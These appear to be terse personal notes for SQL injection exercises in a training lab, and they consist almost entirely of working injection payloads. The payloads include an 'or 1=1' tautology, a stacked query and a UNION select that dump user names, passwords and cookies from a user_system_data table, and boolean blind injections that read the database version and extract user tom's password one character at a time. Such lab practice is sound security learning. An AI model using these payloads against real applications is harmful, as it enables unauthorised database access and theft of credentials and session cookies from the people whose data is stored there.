#3
##look for Smith
##list them all
'or 1=1--

##get data from the other table appending new sql statement
'; select * from user_system_data --

##get data from the other table using union
'union select userid,user_name,password,cookie,'a String','a String',1 from user_system_data --

#5
##add a user test
##test AND True -> False (already exists)
##test AND False -> True (created)

##check the db version
test' AND substring(database_version(),1,1) = 1--
test' AND substring(database_version(),1,1) = 2--

#check tom password
tom' AND substring(password,1,1) = 'a'--
tom' AND substring(password,2,1) = 'i'--
